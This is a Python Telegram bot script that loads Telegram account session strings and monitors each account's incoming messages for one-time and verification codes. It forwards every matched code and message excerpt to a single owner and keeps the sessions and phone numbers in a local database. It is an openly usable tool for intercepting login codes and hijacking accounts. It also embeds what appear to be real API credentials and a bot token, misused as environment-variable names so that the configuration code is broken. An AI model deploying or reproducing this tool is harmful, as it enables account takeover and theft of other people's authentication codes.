import asyncio
import re
import os
import sys
import logging
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import sqlite3
from datetime import datetime
from typing import Dict, Any

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Load configuration from environment variables
API_ID = int(os.environ.get('38190726', 0))
API_HASH = os.environ.get('66a4eebff562f2035bf2acabec3dd7d5', '')
BOT_TOKEN = os.environ.get('8634603705:AAH7v0fwn4C3vK_SRQnWOh3OnqTdyFHRukA', '')
OWNER_ID = int(os.environ.get('1899208318', 0))

class SessionOTPBot:
    def __init__(self):
        # Validate configuration
        if API_ID == 0 or not API_HASH or not BOT_TOKEN or OWNER_ID == 0:
            error_msg = (
                "❌ Missing configuration!\n"
                "Please set these environment variables on Render.com:\n"
                "API_ID, API_HASH, BOT_TOKEN, OWNER_ID\n\n"
                "How to get them:\n"
                "1. API_ID & API_HASH: https://my.telegram.org\n"
                "2. BOT_TOKEN: @BotFather on Telegram\n"
                "3. OWNER_ID: Your Telegram user ID"
            )
            logger.error(error_msg)
            raise ValueError(error_msg)
        
        self.bot = None
        self.active_sessions: Dict[int, Any] = {}
        self.conn = None
        self.is_running = True
        
        logger.info(f"Bot initializing with API_ID: {API_ID}")
        self.init_database()
    
    def init_database(self):
        """Initialize SQLite database"""
        try:
            self.conn = sqlite3.connect('sessions.db', check_same_thread=False)
            cursor = self.conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_string TEXT,
                    phone_number TEXT,
                    created_at TEXT,
                    is_active INTEGER DEFAULT 1
                )
            ''')
            self.conn.commit()
            logger.info("Database initialized successfully")
        except Exception as e:
            logger.error(f"Database initialization error: {e}")
            raise
    
    async def monitor_session(self, session_string: str, session_id: int):
        """Monitor a single session for OTPs"""
        client = None
        try:
            logger.info(f"Starting monitor for session {session_id}")
            client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
            await client.start()
            
            @client.on(events.NewMessage(incoming=True))
            async def handle_message(event):
                try:
                    message_text = event.raw_text.lower()
                    
                    # OTP detection patterns
                    otp_patterns = [
                        r'\b\d{5,6}\b',
                        r'code[:\s]*(\d+)',
                        r'otp[:\s]*(\d+)',
                        r'verification[:\s]*(\d+)',
                        r'(\d{4,6})'
                    ]
                    
                    for pattern in otp_patterns:
                        match = re.search(pattern, message_text, re.IGNORECASE)
                        if match:
                            otp_code = match.group(1) if match.groups() else match.group(0)
                            
                            # Send OTP to owner
                            if self.bot:
                                await self.bot.send_message(
                                    OWNER_ID,
                                    f"🔐 **OTP Received!**\n"
                                    f"📱 Session ID: `{session_id}`\n"
                                    f"🔑 Code: `{otp_code}`\n"
                                    f"📝 Message: {event.raw_text[:200]}"
                                )
                                logger.info(f"OTP forwarded for session {session_id}")
                            break
                            
                except Exception as e:
                    logger.error(f"Error handling message: {e}")
            
            # Keep client running
            while self.is_running and session_id in self.active_sessions:
                await asyncio.sleep(1)
                if not client.is_connected():
                    await client.disconnect()
                    break
                    
        except Exception as e:
            logger.error(f"Session {session_id} error: {e}")
            if self.bot:
                await self.bot.send_message(
                    OWNER_ID,
                    f"❌ Session {session_id} error: {str(e)[:100]}"
                )
        finally:
            if client:
                await client.disconnect()
            logger.info(f"Session {session_id} monitor stopped")
    
    async def run(self):
        """Start the bot"""
        try:
            # Create and start bot
            self.bot = TelegramClient('bot_session', API_ID, API_HASH)
            await self.bot.start(bot_token=BOT_TOKEN)
            logger.info("Bot started successfully!")
            
            # Notify owner
            await self.bot.send_message(
                OWNER_ID,
                "✅ **Session OTP Bot is online!**\n\n"
                "**Commands:**\n"
                "/add `<session_string>` `<phone>` - Add new session\n"
                "/list - List all active sessions\n"
                "/remove `<id>` - Remove a session\n"
                "/status - Check bot status\n"
                "/help - Show this help"
            )
            
            # Register command handlers
            @self.bot.on(events.NewMessage(pattern='/start'))
            async def start_command(event):
                if event.sender_id == OWNER_ID:
                    await event.reply("✅ Bot is running! Use /help for commands.")
            
            @self.bot.on(events.NewMessage(pattern='/help'))
            async def help_command(event):
                if event.sender_id == OWNER_ID:
                    help_text = (
                        "**📱 Session OTP Bot Commands:**\n\n"
                        "`/add <session_string> <phone>` - Add a new session to monitor\n"
                        "`/list` - List all active sessions\n"
                        "`/remove <session_id>` - Remove a session\n"
                        "`/status` - Check bot status\n\n"
                        "**How to get session string:**\n"
                        "```python\n"
                        "from telethon import TelegramClient\n"
                        "from telethon.sessions import StringSession\n\n"
                        "client = TelegramClient(StringSession(), API_ID, API_HASH)\n"
                        "await client.start()\n"
                        "print(StringSession.save(client.session))\n"
                        "```"
                    )
                    await event.reply(help_text)
            
            @self.bot.on(events.NewMessage(pattern='/add'))
            async def add_session(event):
                if event.sender_id != OWNER_ID:
                    return
                
                try:
                    parts = event.raw_text.split(maxsplit=2)
                    if len(parts) < 3:
                        await event.reply("❌ Usage: `/add <session_string> <phone_number>`")
                        return
                    
                    session_string = parts[1]
                    phone_number = parts[2]
                    
                    # Save to database
                    cursor = self.conn.cursor()
                    cursor.execute(
                        "INSERT INTO sessions (session_string, phone_number, created_at) VALUES (?, ?, ?)",
                        (session_string, phone_number, datetime.now().isoformat())
                    )
                    self.conn.commit()
                    session_id = cursor.lastrowid
                    
                    # Start monitoring
                    task = asyncio.create_task(self.monitor_session(session_string, session_id))
                    self.active_sessions[session_id] = task
                    
                    await event.reply(f"✅ **Session added!**\nID: `{session_id}`\nPhone: {phone_number}\nMonitoring started.")
                    logger.info(f"Session {session_id} added for {phone_number}")
                    
                except Exception as e:
                    logger.error(f"Add session error: {e}")
                    await event.reply(f"❌ Error: {str(e)[:200]}")
            
            @self.bot.on(events.NewMessage(pattern='/list'))
            async def list_sessions(event):
                if event.sender_id != OWNER_ID:
                    return
                
                cursor = self.conn.cursor()
                cursor.execute("SELECT id, phone_number, created_at, is_active FROM sessions WHERE is_active=1")
                sessions = cursor.fetchall()
                
                if not sessions:
                    await event.reply("📭 No active sessions found.")
                    return
                
                response = "**📋 Active Sessions:**\n\n"
                for sid, phone, created, active in sessions:
                    status = "🟢 Active" if sid in self.active_sessions else "🔴 Stopped"
                    response += f"**ID:** `{sid}`\n📞 {phone}\n📅 {created[:10]}\n{status}\n\n"
                
                await event.reply(response)
            
            @self.bot.on(events.NewMessage(pattern='/remove'))
            async def remove_session(event):
                if event.sender_id != OWNER_ID:
                    return
                
                try:
                    parts = event.raw_text.split()
                    if len(parts) < 2:
                        await event.reply("❌ Usage: `/remove <session_id>`")
                        return
                    
                    session_id = int(parts[1])
                    
                    # Stop monitoring
                    if session_id in self.active_sessions:
                        self.active_sessions[session_id].cancel()
                        del self.active_sessions[session_id]
                    
                    # Remove from database
                    cursor = self.conn.cursor()
                    cursor.execute("UPDATE sessions SET is_active=0 WHERE id=?", (session_id,))
                    self.conn.commit()
                    
                    await event.reply(f"✅ Session `{session_id}` removed successfully")
                    logger.info(f"Session {session_id} removed")
                    
                except Exception as e:
                    await event.reply(f"❌ Error: {str(e)}")
            
            @self.bot.on(events.NewMessage(pattern='/status'))
            async def status_command(event):
                if event.sender_id != OWNER_ID:
                    return
                
                cursor = self.conn.cursor()
                cursor.execute("SELECT COUNT(*) FROM sessions WHERE is_active=1")
                total = cursor.fetchone()[0]
                running = len(self.active_sessions)
                
                await event.reply(
                    f"**📊 Bot Status:**\n"
                    f"• Total sessions: {total}\n"
                    f"• Active monitors: {running}\n"
                    f"• Uptime: Online\n"
                    f"• PID: {os.getpid()}"
                )
            
            # Keep bot running
            await self.bot.run_until_disconnected()
            
        except Exception as e:
            logger.error(f"Bot error: {e}")
            raise
        finally:
            await self.stop()
    
    async def stop(self):
        """Clean shutdown"""
        logger.info("Shutting down...")
        self.is_running = False
        
        # Cancel all monitoring tasks
        for task in self.active_sessions.values():
            task.cancel()
        
        if self.bot:
            await self.bot.disconnect()
        
        if self.conn:
            self.conn.close()
        
        logger.info("Shutdown complete")

async def main():
    """Main entry point"""
    bot = None
    try:
        bot = SessionOTPBot()
        await bot.run()
    except KeyboardInterrupt:
        logger.info("Received shutdown signal")
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)
    finally:
        if bot:
            await bot.stop()

if __name__ == "__main__":
    asyncio.run(main())
